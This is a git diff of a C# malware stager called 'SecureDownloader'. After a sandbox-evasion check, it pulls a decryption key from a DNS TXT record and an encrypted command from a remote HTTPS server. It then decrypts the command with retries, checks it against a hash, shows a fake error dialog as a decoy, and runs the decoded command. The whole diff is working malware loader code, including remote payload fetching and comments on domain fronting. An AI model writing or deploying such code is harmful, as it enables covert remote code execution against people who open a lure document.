@@ -120,28 +120,36 @@ namespace SecureDownloader {
             // the decrypted text. 
             string plaintext = null;
 
-            // Create an RijndaelManaged object 
-            // with the specified key and IV. 
-            using (RijndaelManaged rijAlg = new RijndaelManaged()) {
-                rijAlg.Key = Key;
-                rijAlg.IV = IV;
+            try
+            {
+                // Create an RijndaelManaged object 
+                // with the specified key and IV. 
+                using (RijndaelManaged rijAlg = new RijndaelManaged())
+                {
+                    rijAlg.Key = Key;
+                    rijAlg.IV = IV;
 
-                // Create a decrytor to perform the stream transform.
-                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+                    // Create a decrytor to perform the stream transform.
+                    ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
 
-                // Create the streams used for decryption. 
-                using (MemoryStream msDecrypt = new MemoryStream(cipherText)) {
-                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) {
-                        using (StreamReader srDecrypt = new StreamReader(csDecrypt)) {
+                    // Create the streams used for decryption. 
+                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                    {
+                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                        {
+                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                            {
 
-                            // Read the decrypted bytes from the decrypting stream 
-                            // and place them in a string.
-                            plaintext = srDecrypt.ReadToEnd();
+                                // Read the decrypted bytes from the decrypting stream 
+                                // and place them in a string.
+                                plaintext = srDecrypt.ReadToEnd();
+                            }
                         }
                     }
                 }
+                return plaintext;
             }
-            return plaintext;
+            catch { return ""; }
         }
 
         // stolen fron http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
@@ -184,13 +192,31 @@ namespace SecureDownloader {
 
             return s;
         }
+
+        public static bool CompareHashes(string payload, string origHash)
+        {
+            byte[] bytes = Encoding.Unicode.GetBytes(payload);
+            System.Security.Cryptography.SHA256Managed sha256 = new System.Security.Cryptography.SHA256Managed();
+            byte[] hashBytes = sha256.ComputeHash(bytes);
+            string hash = String.Empty;
+            foreach (byte x in hashBytes)
+            {
+                hash += String.Format("{0:x2}", x);
+            }
+
+            return origHash == hash;
+        }
     }
 
     class Program {
+        // PS> $text = <paste payload here (before encryption)>
+        // PS> $algo = [Security.Cryptography.HashAlgorithm]::Create("SHA256")
+        // PS> $result = [System.BitConverter]::ToString($algo.ComputeHash([System.Text.Encoding]::Unicode.GetBytes($text))).ToLower() -replace "-",""
+        const string origHash = "<GENERATE HASH WITH ABOVE>";
+        const int SLEEPTIME = 30;
         static void Main() {
             SandboxCheck.izSafe();
 
-            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
             //string data;
             //var version = Environment.Version;
             //if (version.Major >= 4) //domain fronting requires .NET 4.0 or higher
@@ -202,14 +228,29 @@ namespace SecureDownloader {
             //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
             //}
             //Environment.Exit(0);
-
             string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf2");
-
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
 
-            string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
-            string decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
+            int retries = 300;
+            string decodedCmd = String.Empty;
+            do
+            {
+                byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
+                string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
+
+                if (cmd != "")
+                {
+                    decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
+                    if(HelperFunctions.CompareHashes(decodedCmd, origHash))
+                    {
+                        break;
+                    }
+                }
+
+                retries--;
+            } while (retries > 0);
+
             MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
             FunStuff.DoFunStuff(decodedCmd);
         }
